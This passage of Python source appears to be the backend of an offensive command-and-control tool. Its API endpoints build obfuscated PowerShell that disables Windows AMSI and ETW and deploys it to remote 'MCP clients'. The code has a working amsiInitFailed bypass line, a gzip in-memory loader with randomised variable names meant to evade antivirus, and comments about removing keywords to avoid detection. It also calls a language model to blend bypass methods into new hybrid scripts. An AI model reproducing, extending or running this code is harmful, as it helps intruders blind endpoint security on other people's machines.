        full_script = obfuscator.obfuscate_amsi_script(hybrid_script)

        # Add invocation
        invocation_params = []
        if config.enable_verbose:
            invocation_params.append("-EnableVerbose")
        # ETW patching is now mandatory
        invocation_params.append("-PatchEtw")

        invocation = f"\n\nInvoke-HybridBypass {' '.join(invocation_params)}"
        full_script += invocation

        # Basic validation: check if script has minimum expected content
        if len(full_script) < 500:
            log.warning(f"[amsi-auto] Attempt {attempt}/{max_attempts} - Generated script too short ({len(full_script)} bytes)")
            if attempt < max_attempts:
                previous_script = hybrid_script
                error_feedback = f"Generated script was too short ({len(full_script)} bytes). Ensure full PowerShell function with all logic included."
                continue

        # Check for basic PowerShell syntax
        if "function Invoke-HybridBypass" not in full_script and "function {0}HybridBypass".format(config.function_prefix) not in full_script:
            log.warning(f"[amsi-auto] Attempt {attempt}/{max_attempts} - Missing expected function definition")
            if attempt < max_attempts:
                previous_script = hybrid_script
                error_feedback = "Function definition missing or incorrect. Must include 'function Invoke-HybridBypass' or equivalent."
                continue

        # Script looks valid, return it
        log.info(f"[amsi-auto] Attempt {attempt}/{max_attempts} - Successfully generated hybrid script ({len(full_script)} bytes)")
        bypass_method_used = f"auto (LLM-mixed hybrid, attempt {attempt})"
        return full_script, bypass_method_used

    # All attempts exhausted
    log.error(f"[amsi-auto] Failed to generate valid hybrid script after {max_attempts} attempts")
    return None, None


def _encode_script_with_lzma_streaming(script: str) -> str:
    import base64, gzip, random, string
    def rv(): return f"${random.choice(string.ascii_lowercase)}{random.randint(10,99)}"

    # 1. Compress
    compressed = gzip.compress(script.encode('utf-16-le'), compresslevel=9)
    payload_bytes = ",".join([str(b) for b in compressed])
    
    # 2. Polymorphic Variables
    v_strm, v_gz, v_rd, v_line, v_buf, v_bc = rv(), rv(), rv(), rv(), rv(), rv()

    # 3. CONTEXT-AWARE LOADER: 
    # Tracks open braces '{' to ensure multi-line blocks are executed together.
    # This fixes the "Missing closing '}'" error.
    stub = f"""
{v_strm} = [System.IO.MemoryStream]::new([byte[]]({payload_bytes}))
{v_gz} = New-Object System.IO.Compression.GZipStream({v_strm}, [System.IO.Compression.CompressionMode]::Decompress)
{v_rd} = New-Object System.IO.StreamReader({v_gz}, [System.Text.Encoding]::Unicode)

{v_buf} = ""
{v_bc} = 0

while (!{v_rd}.EndOfStream) {{
    {v_line} = {v_rd}.ReadLine()
    if ({v_line}.Trim().Length -eq 0) {{ continue }}
    
    {v_buf} += {v_line} + "`n"
    
    # Count opening and closing braces to track scope
    {v_bc} += ([regex]::Matches({v_line}, '{{').Count)
    {v_bc} -= ([regex]::Matches({v_line}, '}}').Count)
    
    # If all braces are closed, execute the accumulated buffer
    if ({v_bc} -le 0 -and {v_buf}.Trim().Length -gt 0) {{
        try {{
            . ([scriptblock]::Create({v_buf}))
        }} catch {{}}
        {v_buf} = ""
        {v_bc} = 0
    }}
}}
{v_rd}.Close()
""".strip()
    return stub

def load_amsi_bp_template(bypass_method: str = "provider") -> str:
    """
    Load the AMSI_BP script template based on bypass method.

    Methods:
    - provider: INvoke_AS4MS1_alt4.ps1 (Provider-based AMSI patching with ETW)
    - ghost: D1s4bl3copy.ps1 (Lightweight AmsiScanBuffer patch)
    - ghost_stealth: ghost_stealth.ps1 (Stealth ETW/WER patching with module overloading)
    """
    script_map = {
        "provider": "/app/AMSI/INvoke_AS4MS1_alt4.ps1",
        "ghost": "/app/AMSI/D1s4bl3copy.ps1",
        "ghost_stealth": "/app/AMSI/ghost_stealth.ps1"
    }

    script_path = script_map.get(bypass_method, script_map["provider"])

    try:
        with open(script_path, "r", encoding="utf-8-sig") as f:
            return f.read()
    except FileNotFoundError:
        log.warning(f"AMSI_BP template file not found: {script_path}, using fallback")
        # Try fallback to provider method
        if bypass_method != "provider":
            try:
                with open(script_map["provider"], "r", encoding="utf-8-sig") as f:
                    return f.read()
            except FileNotFoundError:
                pass

        # Final fallback - use embedded minimal version
        log.warning("All AMSI_BP template files not found, using minimal fallback")
        return """function Invoke-ASAMSI {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [switch]$EnableVerbose,
        [Parameter(Mandatory = $false)]
        [switch]$PatchEtw
    )

    Write-Host "[*] AMSI_BP Placeholder" -ForegroundColor Yellow
    # Minimal AMSI_BP for fallback
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    Write-Host "[+] AMSI_BP Applied" -ForegroundColor Green
}"""


# -------------------------
# API Endpoints
# -------------------------
@router.post("/preview", response_model=AMSIScriptPreviewResponse)
def preview_obfuscated_amsi_bp_script(
    request: AMSIScriptPreviewRequest = Body(...),
    user = Depends(require_role())
):
    """
    Preview the obfuscated AMSI_BP script without deploying it.
    Shows how the script will look with the selected obfuscation level and bypass method.
    """
    try:
        # If auto mode, use provider for preview
        bypass_method = request.config.bypass_method if request.config.bypass_method != "auto" else "provider"

        # Load AMSI_BP template based on bypass method
        amsi_bp_template = load_amsi_bp_template(bypass_method)

        # Create obfuscator
        obfuscator = AMSIObfuscator(request.config)

        # Obfuscate the script
        obfuscated_script = obfuscator.obfuscate_amsi_script(amsi_bp_template)

        # Add invocation at the end
        invocation_params = []
        if request.config.enable_verbose:
            invocation_params.append("-EnableVerbose")
        # ETW patching is now mandatory
        invocation_params.append("-PatchEtw")

        # No comments - avoid AV keyword detection
        invocation = f"\n\n{obfuscator.function_mappings.get('Invoke-ASAMSI', 'Invoke-ASAMSI')} {' '.join(invocation_params)}"
        obfuscated_script += invocation

        script_size = len(obfuscated_script.encode('utf-8'))

        return AMSIScriptPreviewResponse(
            success=True,
            obfuscation_level=request.config.obfuscation_level,
            script_content=obfuscated_script,
            script_size_bytes=script_size,
            script_size_kb=round(script_size / 1024, 2),
            variable_mappings=obfuscator.variable_mappings,
            function_mappings=obfuscator.function_mappings
        )

    except Exception as e:
        log.error(f"[amsi-deployment] Preview failed: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Preview failed: {str(e)}")


@router.post("/deploy", response_model=AMSIDeploymentResponse)
async def deploy_amsi_bp_to_client(
    request: AMSIDeploymentRequest = Body(...),
    db: Session = Depends(get_db),
    user: User = Depends(require_role())
):
    """
    Deploy obfuscated AMSI_BP script to a specific MCP client.
    Creates an instruction that will be executed by the target client.

    Supports multiple bypass methods:
    - provider: Provider-based AMSI patching (INvoke_AS4MS1_alt4.ps1)
    - elite: Obfuscated provider patching (elite-1774308283581.ps1)
    - ghost: Lightweight AmsiScanBuffer patch (D1s4bl3copy.ps1)
    - auto: Try all methods sequentially until one succeeds
    """
    try:
        # Handle auto mode - Use LLM to mix bypass methods into hybrid script
        if request.config.bypass_method == "auto":
            log.info("[amsi-auto] Attempting LLM-based code mixing with iterative refinement")

            # Try to generate LLM-mixed hybrid script with automatic retry
            full_script, bypass_method_used = await generate_hybrid_with_retry(
                db=db,
                config=request.config,
                max_attempts=3
            )

            if not full_script:
                # LLM mixing failed, fallback to sequential execution
                log.warning("[amsi-auto] LLM mixing failed, using sequential fallback")
                methods = ["provider", "ghost", "ghost_stealth"]
                full_script_parts = []

                # Remove ALL AV-triggering keywords from comments
                full_script_parts.append("$success = $false")

                for idx, method in enumerate(methods, 1):
                    template = load_amsi_bp_template(method)
                    obfuscator = AMSIObfuscator(request.config)
                    obfuscated = obfuscator.obfuscate_amsi_script(template)

                    if method == "provider":
                        func_name = obfuscator.function_mappings.get('Invoke-ASAMSI', 'Invoke-ASAMSI')
                    elif method == "ghost":
                        func_name = obfuscator.function_mappings.get('Invoke-Ghost_Final', 'Invoke-Ghost_Final')
                    else:  # ghost_stealth
                        func_name = obfuscator.function_mappings.get('Invoke-Ghost_Stealth_2026', 'Invoke-Ghost_Stealth_2026')

                    # No comments that mention methods or techniques
                    full_script_parts.append(f"\nif (-not $success) {{")
                    full_script_parts.append("    try {")
                    full_script_parts.append(obfuscated)

                    invocation_params = []
                    if request.config.enable_verbose:
                        if method == "provider":
                            invocation_params.append("-EnableVerbose")
                        else:
                            invocation_params.append("-v")
                    # ETW patching is now mandatory for provider method
                    if method == "provider":
                        invocation_params.append("-PatchEtw")

                    full_script_parts.append(f"        {func_name} {' '.join(invocation_params)}")
                    full_script_parts.append("        $success = $true")
                    full_script_parts.append("    } catch { }")
                    full_script_parts.append("}")

                full_script = "\n".join(full_script_parts)
                bypass_method_used = "auto (sequential fallback)"

        else:
            # Single method mode
            bypass_method_used = request.config.bypass_method

            # Load AMSI_BP template based on bypass method
            amsi_bp_template = load_amsi_bp_template(bypass_method_used)

            # Handle dynamic ETW injection for Ghost method (now mandatory)
            if bypass_method_used == "ghost":
                log.info("[amsi-ghost] Dynamically injecting ETW patching code into Ghost method")
                amsi_bp_template = inject_etw_into_ghost(amsi_bp_template)

            # Create obfuscator
            obfuscator = AMSIObfuscator(request.config)

            # Obfuscate the script
            obfuscated_script = obfuscator.obfuscate_amsi_script(amsi_bp_template)

            # Add invocation at the end for single method
            invocation_params = []

            # Determine function name based on bypass method
            if bypass_method_used == "provider":
                function_name = obfuscator.function_mappings.get('Invoke-ASAMSI', 'Invoke-ASAMSI')
                if request.config.enable_verbose:
                    invocation_params.append("-EnableVerbose")
                # ETW patching is now mandatory
                invocation_params.append("-PatchEtw")
            elif bypass_method_used == "ghost":
                function_name = obfuscator.function_mappings.get('Invoke-Ghost_Final', 'Invoke-Ghost_Final')
                if request.config.enable_verbose:
                    invocation_params.append("-v")
            else:  # ghost_stealth
                function_name = obfuscator.function_mappings.get('Invoke-Ghost_Stealth_2026', 'Invoke-Ghost_Stealth_2026')
                if request.config.enable_verbose:
                    invocation_params.append("-v")

            # No comments - avoid AV keyword detection
            invocation = f"\n\n{function_name} {' '.join(invocation_params)}"
            full_script = obfuscated_script + invocation

        script_size = len(full_script.encode('utf-8'))

        # ENCODE SCRIPT WITH LZMA STREAMING LOADER TO EVADE AV
        # This compresses with LZMA and creates in-memory decompression wrapper
        log.info(f"[amsi-deployment] Encoding script with LZMA streaming (original size: {script_size} bytes)")
        encoded_script = _encode_script_with_lzma_streaming(full_script)
        encoded_size = len(encoded_script.encode('utf-8'))
        log.info(f"[amsi-deployment] Encoded size: {encoded_size} bytes (LZMA wrapper + compressed payload)")

        # Create MCP instruction using the mcp_service
        instruction_id = None
        try:
            # Validate client_id
            client_id = mcp_service.validate_client_id(request.client_id)

            # Create instruction via MCP service with ENCODED script
            instruction_result = await mcp_service.create_instruction_service(
                db=db,
                client_id=client_id,
                command=encoded_script,  # Send encoded version instead of plain text
                user=user
            )

            instruction_id = instruction_result.get("id")

            log.info(f"[amsi-deployment] Deployed to client {request.client_id}")
            log.info(f"[amsi-deployment] Bypass method: {bypass_method_used}")
            log.info(f"[amsi-deployment] Script size: {script_size} bytes ({script_size/1024:.2f} KB)")
            log.info(f"[amsi-deployment] Obfuscation level: {request.config.obfuscation_level}")
            log.info(f"[amsi-deployment] Instruction ID: {instruction_id}")

        except Exception as e:
            log.error(f"[amsi-deployment] Failed to create MCP instruction: {str(e)}")
            raise HTTPException(status_code=500, detail=f"Failed to create instruction: {str(e)}")

        return AMSIDeploymentResponse(
            success=True,
            client_id=request.client_id,
            obfuscation_level=request.config.obfuscation_level,
            script_size_bytes=script_size,
            script_preview=full_script[:500] + "..." if len(full_script) > 500 else full_script,
            instruction_id=instruction_id,
            timestamp=datetime.utcnow().isoformat() + "Z",
            message=f"AMSI_BP script prepared with {request.config.obfuscation_level} obfuscation using {bypass_method_used} bypass method. Ready for deployment to client {request.client_id}."
        )

    except Exception as e:
        log.error(f"[amsi-deployment] Deployment failed: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Deployment failed: {str(e)}")


@router.get("/health")
def health_check():
    """Check AMSI deployment service health"""
    return {
        "status": "healthy",
        "service": "amsi-deployment",
        "version": "1.0.0",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "capabilities": [
            "amsi_bp_obfuscation",
            "mcp_client_deployment",
            "multi_level_obfuscation"
        ],
        "supported_features": {
            "obfuscation_levels": ["base64", "advanced", "elite"],
            "bypass_methods": ["provider", "ghost", "ghost_stealth", "auto"],
            "amsi_bp_techniques": ["memory_patch", "provider_patching", "amsi_scan_buffer_patch", "module_overloading"],
            "loader_method": "lzma_streaming",
            "optional_features": [
                "etw_patching",
                "wer_patching",
                "dynamic_etw_injection",
                "verbose_output",
                "llm_based_code_mixing",
                "polymorphic_generation",
                "multi_method_fallback"
            ]
        }
    }
